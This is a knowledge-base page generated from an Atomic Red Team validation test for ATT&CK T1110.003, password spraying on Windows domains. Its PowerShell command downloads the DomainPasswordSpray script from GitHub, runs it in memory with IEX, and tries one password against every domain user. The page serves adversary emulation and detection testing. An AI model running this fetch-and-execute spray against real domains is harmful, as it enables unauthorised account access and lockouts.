---
atomic_guid: "263ae743-515f-4786-ac7d-41ef3a0d4b2b"
title: "Password Spray (DomainPasswordSpray)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "263ae743-515f-4786-ac7d-41ef3a0d4b2b"
  - "Password Spray (DomainPasswordSpray)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Password Spray (DomainPasswordSpray)

Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain

https://github.com/dafthack/DomainPasswordSpray

## Metadata

- Atomic GUID: 263ae743-515f-4786-ac7d-41ef3a0d4b2b
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### domain

- description: Domain to brute force against
- type: string
- default: $Env:USERDOMAIN

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
